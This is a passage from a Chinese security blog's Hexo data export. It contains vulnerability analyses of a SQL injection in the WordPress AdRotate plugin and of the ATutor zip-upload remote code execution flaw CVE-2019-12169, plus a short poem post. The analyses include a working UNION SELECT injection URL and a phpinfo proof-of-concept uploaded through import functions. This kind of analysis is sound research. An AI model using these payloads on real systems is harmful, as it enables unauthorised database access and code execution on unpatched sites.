title=\"后记\"></a>后记</h2><p>漏洞比较简单，但是分析wordpress机制的过程还是比较有意思的</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/拖库1.jpg","excerpt":"<p>在AdRotate Plugin5.2以及5.2之前的版本中，存在一处sql注入漏洞，该漏洞为FortiGuard实验室发现</p>","more":"<p>漏洞位于AdRotate Plugin的\\dashboard\\publisher\\adverts-edit.php</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134445-1848c74e-d38e-1.png\"><br>可见上图中，存在着多出sql查询语句</p>\n<p>但是位于25行处，明显可见存在sql注入隐患</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134456-1eb7e6e6-d38e-1.png\"><br>位于上图红框处，在拼接sql语句时，$ad_edit_id变量被拼接在id值部分。但是在这里，并没有用单引号将其值闭合</p>\n<p>$ad_edit_id变量值可以通过get请求的方式传入，如下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134513-28cd777c-d38e-1.png\"></p>\n<p>位于上图173行，可见$ad_edit_id = esc_attr($_GET[‘ad’]);</p>\n<p>esc_attr方法是用来过滤HTML标签的，对sql注入无影响</p>\n<p>esc_attr方法见下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134539-3896947c-d38e-1.png\"></p>\n<p>这样就导致了一个简单的sql注入的产生</p>\n<p>具体的payload如下</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/wordpress/wp-admin/admin.php?page=adrotate-ads&amp;view=edit&amp;ad=-1+UNION+SELECT+1%2CUSER%28%29%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C1</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134552-4027b3d8-d38e-1.png\"></p>\n<p>这里是一个有回显的注入，数据库user被回显到name处，sql注入执行成功</p>\n<p>漏洞分析到此结束，这个漏洞自身并没有什么亮点，不过在分析这个漏洞时，却发现了一些知识点</p>\n<h2 id=\"问题一、Wordpress是如何处理-GET-POST等请求\"><a href=\"#问题一、Wordpress是如何处理-GET-POST等请求\" class=\"headerlink\" title=\"问题一、Wordpress是如何处理$_GET $_POST等请求\"></a>问题一、Wordpress是如何处理$_GET $_POST等请求</h2><p>在上文分析的漏洞中，$ad_edit_id参数由$_GET[‘ad’]获取</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134604-46f61ec0-d38e-1.png\"></p>\n<p>传入并拼接的sql语句中执行<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134618-4f6fbd18-d38e-1.png\"></p>\n<p>如果$ad_edit_id被单引号闭合呢？例如下图<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134630-569f59f4-d38e-1.png\"><br>我们是否可以通过get传入单引号，闭合语句中的单引号并进行注入呢？</p>\n<p>我们构造一个简单的payload测试下</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;ad=-1’</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134642-5dc0e428-d38e-1.png\"></p>\n<p>在adrotate_manage方法中下断<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134655-655ec272-d38e-1.png\"><br>可见在adrotate_manage中的$_GET[‘ad’]中的值，此时为”-1\\’”<br>也就是说，我们传入的单引号在进入adrotate_manage方法之前，已经被wordpress转义</p>\n<p>具体在什么位置被转义的呢？跟踪一下wordpress的代码<br>位于wp-includes\\load.php中<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134709-6de5dd68-d38e-1.png\"><br>由上图可见，wordpress将$_GET$_POST$_COOKIE$_SERVER中的值，使用add_magic_quotes方法进行过滤<br>值得一提的是，随后，将过滤后的GET与POST数组合并后覆盖$_REQUEST。在以往一些安全性不高的程序中，往往会出现，过滤了GET与POST，却忘记过滤REQUEST的情况，导致漏洞的产生。</p>\n<p>跟入add_magic_quotes方法<br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134721-754300f4-d38e-1.png\"><br>可见，该方法使用addslashes方法，将传入的键值过滤，因此我们传入的”-1’”被过滤为”-1\\’”，可见wordpress在入口处是存在过滤机制的<br>这里引申出一个思考题(问题二)：</p>\n<h2 id=\"问题二：wordprss的这种过滤机制，是否仍然存在安全隐患\"><a href=\"#问题二：wordprss的这种过滤机制，是否仍然存在安全隐患\" class=\"headerlink\" title=\"问题二：wordprss的这种过滤机制，是否仍然存在安全隐患\"></a>问题二：wordprss的这种过滤机制，是否仍然存在安全隐患</h2><p>连接问题一，我们已经知道wordpress是如何处理请求的，即处理请求中的键值</p>\n<p>如果一个插件开发过程中，存在如下的代码</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134735-7d44940c-d38e-1.png\"><br><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134751-86dc854c-d38e-1.png\"><br>插件从请求中读取数组，然后通过INSERT方式将其插入数据库呢？</p>\n<p>在这种情况下，可以在传入的键名中加入payload，如下图</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910134805-8f59a2ea-d38e-1.png\"><br>页面sleep 5秒，sql注入成功<br>以上代码为以往漏洞挖掘中在其他程序中发现的真实案例，有兴趣可以参见<br><a href=\"https://xz.aliyun.com/t/6237\" title=\"从某cmsV4.1.0 sql注入漏洞看程序开发安全隐患\">从某cmsV4.1.0 sql注入漏洞看程序开发安全隐患</a><br>在开发wordpress插件时，会不会仍然有开发者犯下这样的错误呢？</p>\n<h2 id=\"问题三：wordpress是如何加载这个插件，我们如何构造利用链\"><a href=\"#问题三：wordpress是如何加载这个插件，我们如何构造利用链\" class=\"headerlink\" title=\"问题三：wordpress是如何加载这个插件，我们如何构造利用链\"></a>问题三：wordpress是如何加载这个插件，我们如何构造利用链</h2><p>我们的利用点位于wp-content\\plugins\\adrotate\\dashboard\\publisher\\adverts-edit.php</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135233-2edf3cbc-d38f-1.png\"></p>\n<p>这个文件并没有定义与初始化一些变量，直接通过url访问这个地址，显然是不行的</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135247-375fff7a-d38f-1.png\"><br>查找adverts-edit.php在哪里被包含</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135259-3eb6cc0e-d38f-1.png\"></p>\n<p>跟到adrotate.php中，位于274行处，adrotate_manage方法中的if分支里</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135313-46d0e67c-d38f-1.png\"></p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135326-4eece2c0-d38f-1.png\"></p>\n<p>在adrotate_manage方法中，还可以看到$ad_edit_id变量被赋值的过程，见上图173行处</p>\n<p>但是新的问题是，adrotate_manage方法是如何被wordpress调用的，我们怎样构造url才能执行adrotate_manage方法？</p>\n<p>在adrotate.php106行处</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135342-58049592-d38f-1.png\"></p>\n<p>adrotate_manage作为参数传入add_submenu_page方法</p>\n<p>我们来看下add_submenu_page方法</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135357-614c0a2c-d38f-1.png\"></p>\n<p>add_submenu_page()方法为后台顶级菜单添加子菜单，它的参数解释如下</p>\n<p><code>$parent_slug：</code>(字符串) (必须)顶级菜单名称，可以在顶级菜单中加入我们的子菜单，也可以在自定义顶级菜单中加入子菜单；（也就是 add_menu_page() 函数中的 $menu_slug 参数）</p>\n<p><code>$page_title：</code>(字符串) (必须) 这个参数是子菜单的标题，将会显示在浏览器的标题栏，默认为空；</p>\n<p><code>$menu_title：</code>(字符串) (必须) 显示的菜单名称，默认为空；</p>\n<p><code>$capability：</code>(字符串) (必须) 用户权限，定义了具有哪些权限的用户会看到这个子菜单（权限部分请看文章结尾处），默认为空；</p>\n<p><code>$menu_slug：</code>(字符串) (必须) 显示在URl上面的菜单名称，默认为空；</p>\n<p><code>$function：</code>所有调用的函数名称，通过调用这个函数来显示这个子菜单页面的内容。</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135411-69333b5c-d38f-1.png\"></p>\n<p>回到本插件中可以看到，在adrotate中，adrotate插件注册了一个名为Manage Adverts的子菜单，当点击此菜单时，将会执行adrotate_manage方法，此时url为</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/wordpress/wp-admin/admin.php?page=adrotate-ads</span><br></pre></td></tr></table></figure>\n<p>page参数后面的值为add_submenu_page中$menu_slug的值</p>\n<p>既然Manage Adverts为子菜单，那么它的顶级菜单是什么？</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135425-71f746ac-d38f-1.png\"></p>\n<p>可见，在上图103行处，存在一处add_menu_page方法，该方法定义了该插件的顶级菜单，名为AdRotate，访问url为</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/wordpress/wp-admin/admin.php?page=adrotate</span><br></pre></td></tr></table></figure>\n<p>登录wordpress后台，安装好adrotate插件后，可见adrotate已经出现在菜单中，主次菜单名与url符合我们的预期</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135439-7a687522-d38f-1.png\"></p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135452-81db3042-d38f-1.png\"></p>\n<p>回头继续看代码，以上定义顶级菜单，子菜单的行为，都在adrotate_dashboard方法中</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135505-8975e8d8-d38f-1.png\"></p>\n<p>adrotate_dashboard方法是如何被wordpress加载的呢？</p>\n<p>仍然在adrotate.php中</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135516-905213ca-d38f-1.png\"></p>\n<p>在上图77行处，adrotate_dashboard方法作为参数传递入add_action方法中</p>\n<p>add_action方法的作用是将函数连接到指定action上。在这里，将adrotate_dashboard方法连接到admin_menu 钩子上</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20190910135526-96578b38-d38f-1.png\"></p>\n<p>而admin_menu 钩子的作用是在管理员加载管理菜单之前触发所连接上的函数。</p>\n<p>也就是说，在管理员加载管理菜单之前，我们的adrotate_dashboard方法会被加载，adrotate_dashboard方法中的代码被执行，所以我们的adrotate菜单被添加到管理页面的菜单栏中</p>\n<h2 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h2><p>漏洞比较简单，但是分析wordpress机制的过程还是比较有意思的</p>"},{"title":"2020 ,2020！","date":"2019-12-31T09:24:59.000Z","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2020.jpg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n天上白玉京，十二楼五城。仙人抚我顶，结发受长生。\n勿逐世间乐，颇穷理乱情。天地赌一掷，将期轩冕荣。\n\n<!--more-->\n\n记于2019年12月31日，2019年最后一个晚上。","source":"_posts/2020.md","raw":"---\ntitle: 2020 ,2020！\ndate: 2019-12-31 17:24:59\ncategories: 日常\ntags: 杂文\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2020.jpg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n天上白玉京，十二楼五城。仙人抚我顶，结发受长生。\n勿逐世间乐，颇穷理乱情。天地赌一掷，将期轩冕荣。\n\n<!--more-->\n\n记于2019年12月31日，2019年最后一个晚上。","slug":"2020","published":1,"updated":"2020-10-28T02:07:46.816Z","_id":"ckgrozu7t0003wsa93saxdgni","comments":1,"layout":"post","photos":[],"link":"","content":"<p>天上白玉京，十二楼五城。仙人抚我顶，结发受长生。<br>勿逐世间乐，颇穷理乱情。天地赌一掷，将期轩冕荣。</p>\n<a id=\"more\"></a>\n\n<p>记于2019年12月31日，2019年最后一个晚上。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<p>天上白玉京，十二楼五城。仙人抚我顶，结发受长生。<br>勿逐世间乐，颇穷理乱情。天地赌一掷，将期轩冕荣。</p>","more":"<p>记于2019年12月31日，2019年最后一个晚上。</p>"},{"title":"ATutor学习内容管理系统任意文件上传漏洞(CVE-2019-12169)分析","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/3c091f331fbddfc38c244911d7bde42.jpg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","date":"2020-09-10T09:21:19.000Z","_content":"\n漏洞介绍\n--------\n\nATutor是ATutor团队的一套开源的基于Web的学习内容管理系统（LCMS），该系统包括教学内容管理、论坛、聊天室等模块。Atutor与Claroline、 Moddle及Sakai号称为四大开源课程管理系统。\n\nATutor2.2.4语言导入功能处存在一处安全漏洞(CVE-2019-12169)，攻击者可利用该漏洞进行远程代码执行攻击。\n\n经过分析发现，除了CVE-2019-1216所报道的语言导入功能外，ATutor在其他功能模块中也大量存在着相似的漏洞，本文会在后面针对这一点进行介绍。\n\n漏洞分析\n--------\n\n据漏洞披露可知，漏洞触发点存在于mods/_core/languages/language_import.php文件中\n\n首先跟入language_import.php文件\n\n```php\n<?php\n/****************************************************************/\n/* ATutor                                         */\n/****************************************************************/\n/* Copyright (c) 2002-2010                                      */\n/* Inclusive Design Institute                                   */\n/* http://atutor.ca                                     */\n/*                                                              */\n/* This program is free software. You can redistribute it and/or*/\n/* modify it under the terms of the GNU General Public License  */\n/* as published by the Free Software Foundation.            */\n/****************************************************************/\n// $Id$\n\ndefine('AT_INCLUDE_PATH', '../../../include/');\nrequire(AT_INCLUDE_PATH.'vitals.inc.php');\nadmin_authenticate(AT_ADMIN_PRIV_LANGUAGES);\n\nrequire_once(AT_INCLUDE_PATH.'classes/pclzip.lib.php');\nrequire_once(AT_INCLUDE_PATH.'../mods/_core/languages/classes/LanguageEditor.class.php');\nrequire_once(AT_INCLUDE_PATH.'../mods/_core/languages/classes/LanguagesParser.class.php');\n\n/* to avoid timing out on large files */\n@set_time_limit(0);\n\n$_SESSION['done'] = 1;\n\nif (isset($_POST['submit_import'])){\n    require_once(AT_INCLUDE_PATH.'../mods/_core/languages/classes/RemoteLanguageManager.class.php');\n    $remoteLanguageManager = new RemoteLanguageManager();\n    $language_code = explode(\"_\",$_POST['language']);\n    $remoteLanguageManager->import($_POST['language']);\n    header('Location: language_import.php');\n    exit;\n} else if (isset($_POST['submit']) && (!is_uploaded_file($_FILES['file']['tmp_name']) || !$_FILES['file']['size'])) {\n    $msg->addError('LANG_IMPORT_FAILED');\n} else if (isset($_POST['submit']) && !$_FILES['file']['name']) {\n    $msg->addError('IMPORTFILE_EMPTY');\n} else if (isset($_POST['submit']) && is_uploaded_file($_FILES['file']['tmp_name'])) {\n    $languageManager->import($_FILES['file']['tmp_name']);\n    header('Location: ./language_import.php');\n    exit;\n}\n```\n\n从language_import.php文件中35行起，可以发现文件上传相关代码\n\n![f1d2c8415c4c633298881ab7bf76d404.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424170655-f1f7f882-860a-1.png)\n\n从上图红框中代码可知，此处代码块是对文件上传情况进行校验\n\n在文件成功上传后，进入下一个if分支\n\n![1121c09a5fd3ee682fdc0f35913ee33d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424170715-fdb0bcea-860a-1.png)\n\n在这个分支里，程序将调用\\$languageManager-\\>import方法对文件进行处理\n\n继续跟入import方法，位于/mods/_core/languages/classes/LanguageManager.class.php文件中\n\n```php\n// public\n// import language pack from specified file\nfunction import($filename) {\n\tglobal $languageManager, $msg;\n\n    if(strstr($_FILES['file']['name'], 'master')){\n        // hack to create path to subdir for imported github language packs\n        $import_dir = str_replace(\".zip\", \"\", $_FILES['file']['name']).'/';\n    } else if(isset($_POST['language'])){\n        $import_dir = $_POST['language'].'-master/';\n    }\n    require_once(AT_INCLUDE_PATH.'classes/pclzip.lib.php');\n\trequire_once(AT_INCLUDE_PATH.'../mods/_core/languages/classes/LanguagesParser.class.php');\n\n\t$import_path = AT_CONTENT_DIR . 'import/';\n\t$import_path_tmp = $import_path.$import_dir;\n\t$language_xml = @file_get_contents($import_path.'language.xml');\n\t$archive = new PclZip($filename);\n\n\tif ($archive->extract(\tPCLZIP_OPT_PATH,\t$import_path) == 0) {\n\t\texit('Error : ' . $archive->errorInfo(true));\n\t}\n```\n在import方法中程序调用PclZip对压缩包进行处理\n\n```php\n\t\t$archive = new PclZip($filename);\n\n\t\tif ($archive->extract(\tPCLZIP_OPT_PATH,\t$import_path) == 0) {\n\t\t\texit('Error : ' . $archive->errorInfo(true));\n\t\t}\n```\n\n为了更好的理解import方法的执行流程，我们将会进行动态调试。首先构造一个poc.php\n\n```\n<?php phpinfo(); ?>\n```\n\n将这个poc.php打包为poc.zip\n\n![0a70cb1152c4da8afdb860bb66d642d9.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424170822-25b697e6-860b-1.png)\n\n访问如下链接以进入上传页面\n\nhttp://target/ATutor/mods/_core/languages/language_import.php\n\n![5a822f926e62f0615ed92126333ba784.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424170852-37944eea-860b-1.png)\n\n在上传语言包页面中选择构造好的poc.zip并点击import按钮上传。当请求发送给后台服务器，程序执行到下图断点处\n\n![ed87891f5ab9fc8afbf586cb8eade5ed.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424170925-4b189bba-860b-1.png)\n\n此时的\\$import_path值为atutor应用的/content/import路径：”content/import/”，程序调用PclZip的extract方法对压缩包进行解压。接下来我们介绍以下PclZip类\n\n### PclZip\n\nPclZip是一个强大的压缩与解压缩zip文件的PHP类，PclZip library不仅能够压缩与解压缩Zip格式的文件；还能解压缩文档中的内容，同时也可以对现有的ZIP包进行添加或删除文件。\n\n我们接下来看下import方法中是如何使用PclZip，见下图\n\n![bef56d465f0158a156524a4d431262e2.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424170944-569374b0-860b-1.png)\n\n程序创建了上传的zip压缩包的一个PclZip对象进行操作与控制，在解压过程中使用了extract方法。该方法中第一个参数是设置项，第二个是对应设置项的值\n\n我们来看下PCLZIP_OPT_PATH设置项的作用\n\n![6bf20e6b27427f39a0b6d536daa372e8.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424171002-61af3a0a-860b-1.png)\n\n可见，PCLZIP_OPT_PATH设置项指定我们上传的zip文件解压目录为\\$import_path参数对应的路径\n\n解压成功后，poc.zip中内容出现在对应文件夹中\n\n![dbfe063613c36620cdfc66cc3665443d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424171017-6a7f415c-860b-1.png)\n\n查看poc.php中的值，可以发现poc上传成功\n\n![64cc162245f48311e259db798bb674a4.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424171031-72c2b25e-860b-1.png)\n\n访问如下地址，触发poc\n\n![5da715061c21b6f94f2365b838a1a8bc.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424171047-7c27e9b8-860b-1.png)\n\n除此之外，该应用几乎所有import接口，在后台都采用PclZip将上传的zip解压到对应目录中。然而这些操作无一例外的未对压缩包中的文件进行校验。下面举几个例子：\n\n位于mods/_core/themes/import.php文件中的主题导入功能,代码如下:\n\n```php\n/**\n* Imports a theme from a URL or Zip file to Atutor\n* @access  private\n* @author  Shozub Qureshi\n*/\nfunction import_theme() {\n\tglobal $db;\n\tglobal $msg;\n\t\n\tif (isset($_POST['url']) && ($_POST['url'] != 'http://') ) {\n\t\tif ($content = @file_get_contents($_POST['url'])) {\n    \n\t⋮\n        \n\t// unzip file and save into directory in themes\n\t$archive = new PclZip($_FILES['file']['tmp_name']);\n    \n\t//extract contents to importpath/foldrname\n\tif (!$archive->extract($import_path)) {\n\t\t$errors = array('IMPORT_ERROR_IN_ZIP', $archive->errorInfo(true));\n\t\tclr_dir($import_path);\n\t\t$msg->addError($errors);\n\t\theader('Location: index.php'); \n\t\texit;\n\t}\n```\n\n可以发现这里也使用了extract方法将上传文件进行解压\n\n来看一下导入主题功能对应的前端页面\n\n![118a2873749d6200f96edfa1790637c9.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424171145-9ea9e234-860b-1.png)\n\n这里页面与导入语音包的页面极其相似，只不过最终解压后存放的路径不同，不再是content/import/，而是themes/\n\n在此处上传构造好的poc.zip，最终poc.php将会被解压到themes文件夹中\n\n![25a945cf7202608265fdab6909a4e825.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424171205-aac48c54-860b-1.png)\n\n位于/mods/_standard/tests/question_import.php文件的问题导入功能\n\n![54cecd39032e9d1de591ef8498bd8c04.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424171225-b6d6cbd8-860b-1.png)\n\n位于mods/_standard/patcher/index_admin.php文件的补丁导入功能\n\n![1962fed0465d4cdf835a3274e8065876.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424171245-c280f6de-860b-1.png)\n\n这些功能无一例外的存在着相似的漏洞\n\n总结\n----\n\n针对单一文件上传，大多数Web应用都会进行严格的文件类型检测，但是涉及到压缩包上传，很多应用都不会检测压缩包中的内容，直接将压缩包中内容解压到对应目录中，这样就会导致了这类漏洞的产生。","source":"_posts/ATutor-CVE-2019-12169.md","raw":"---\ntitle: ATutor学习内容管理系统任意文件上传漏洞(CVE-2019-12169)分析\ntags: web漏洞分析\ncategories: 技术\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/3c091f331fbddfc38c244911d7bde42.jpg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\ndate: 2020-09-10 17:21:19\n---\n\n漏洞介绍\n--------\n\nATutor是ATutor团队的一套开源的基于Web的学习内容管理系统（LCMS），该系统包括教学内容管理、论坛、聊天室等模块。Atutor与Claroline、 Moddle及Sakai号称为四大开源课程管理系统。\n\nATutor2.2.4语言导入功能处存在一处安全漏洞(CVE-2019-12169)，攻击者可利用该漏洞进行远程代码执行攻击。\n\n经过分析发现，除了CVE-2019-1216所报道的语言导入功能外，ATutor在其他功能模块中也大量存在着相似的漏洞，本文会在后面针对这一点进行介绍。\n\n漏洞分析\n--------\n\n据漏洞披露可知，漏洞触发点存在于mods/_core/languages/language_import.php文件中\n\n首先跟入language_import.php文件\n\n```php\n<?php\n/****************************************************************/\n/* ATutor                                         */\n/****************************************************************/\n/* Copyright (c) 2002-2010                                      */\n/* Inclusive Design Institute                                   */\n/* http://atutor.ca                                     */\n/*                                                              */\n/* This program is free software. You can redistribute it and/or*/\n/* modify it under the terms of the GNU General Public License  */\n/* as published by the Free Software Foundation.            */\n/****************************************************************/\n// $Id$\n\ndefine('AT_INCLUDE_PATH', '../../../include/');\nrequire(AT_INCLUDE_PATH.'vitals.inc.php');\nadmin_authenticate(AT_ADMIN_PRIV_LANGUAGES);\n\nrequire_once(AT_INCLUDE_PATH.'classes/pclzip.lib.php');\nrequire_once(AT_INCLUDE_PATH.'../mods/_core/languages/classes/LanguageEditor.class.php');\nrequire_once(AT_INCLUDE_PATH.'../mods/_core/languages/classes/LanguagesParser.class.php');\n\n/* to avoid timing out on large files */\n@set_time_limit(0);\n\n$_SESSION['done'] = 1;\n\nif (isset($_POST['submit_import'])){\n    require_once(AT_INCLUDE_PATH.'../mods/_core/languages/classes/RemoteLanguageManager.class.php');\n    $remoteLanguageManager = new RemoteLanguageManager();\n    $language_code = explode(\"_\",$_POST['language']);\n    $remoteLanguageManager->import($_POST['language']);\n    header('Location: language_import.php');\n    exit;\n} else if (isset($_POST['submit']) && (!is_uploaded_file($_FILES['file']['tmp_name']) || !$_FILES['file']['size'])) {\n    $msg->addError('LANG_IMPORT_FAILED');\n} else if (isset($_POST['submit']) && !$_FILES['file']['name']) {\n    $msg->addError('IMPORTFILE_EMPTY');\n} else if (isset($_POST['submit']) && is_uploaded_file($_FILES['file']['tmp_name'])) {\n    $languageManager->import($_FILES['file']['tmp_name']);\n    header('Location: ./language_import.php');\n    exit;\n}\n```\n\n从language_import.php文件中35行起，可以发现文件上传相关代码\n\n![f1d2c8415c4c633298881ab7bf76d404.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424170655-f1f7f882-860a-1.png)\n\n从上图红框中代码可知，此处代码块是对文件上传情况进行校验\n\n在文件成功上传后，进入下一个if分支\n\n![1121c09a5fd3ee682fdc0f35913ee33d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424170715-fdb0bcea-860a-1.png)\n\n在这个分支里，程序将调用\\$languageManager-\\>import方法对文件进行处理\n\n继续跟入import方法，位于/mods/_core/languages/classes/LanguageManager.class.php文件中\n\n```php\n// public\n// import language pack from specified file\nfunction import($filename) {\n\tglobal $languageManager, $msg;\n\n    if(strstr($_FILES['file']['name'], 'master')){\n        // hack to create path to subdir for imported github language packs\n        $import_dir = str_replace(\".zip\", \"\", $_FILES['file']['name']).'/';\n    } else if(isset($_POST['language'])){\n        $import_dir = $_POST['language'].'-master/';\n    }\n    require_once(AT_INCLUDE_PATH.'classes/pclzip.lib.php');\n\trequire_once(AT_INCLUDE_PATH.'../mods/_core/languages/classes/LanguagesParser.class.php');\n\n\t$import_path = AT_CONTENT_DIR . 'import/';\n\t$import_path_tmp = $import_path.$import_dir;\n\t$language_xml = @file_get_contents($import_path.'language.xml');\n\t$archive = new PclZip($filename);\n\n\tif ($archive->extract(\tPCLZIP_OPT_PATH,\t$import_path) == 0) {\n\t\texit('Error : ' . $archive->errorInfo(true));\n\t}\n```\n在import方法中程序调用PclZip对压缩包进行处理\n\n```php\n\t\t$archive = new PclZip($filename);\n\n\t\tif ($archive->extract(\tPCLZIP_OPT_PATH,\t$import_path) == 0) {\n\t\t\texit('Error : ' . $archive->errorInfo(true));\n\t\t}\n```\n\n为了更好的理解import方法的执行流程，我们将会进行动态调试。首先构造一个poc.php\n\n```\n<?php phpinfo(); ?>\n```\n\n将这个poc.php打包为poc.zip\n\n![0a70cb1152c4da8afdb860bb66d642d9.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424170822-25b697e6-860b-1.png)\n\n访问如下链接以进入上传页面\n\nhttp://target/ATutor/mods/_core/languages/language_import.php\n\n![5a822f926e62f0615ed92126333ba784.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424170852-37944eea-860b-1.png)\n\n在上传语言包页面中选择构造好的poc.zip并点击import按钮上传。当请求发送给后台服务器，程序执行到下图断点处\n\n![ed87891f5ab9fc8afbf586cb8eade5ed.png](https://xzfile.aliyuncs.com/media/upload/picture/20200424170925-4b189bba-860b-1.png)\n\n此时的\\$import_path值为atutor应用的/content/import路径：”content/import/”，程序调用PclZip的extract方法对压缩包进行解压。接下来我们介绍以下PclZip类\n\n### PclZip\n\nPclZip是一个强大的压缩与解压缩zip文件的PHP类，PclZip 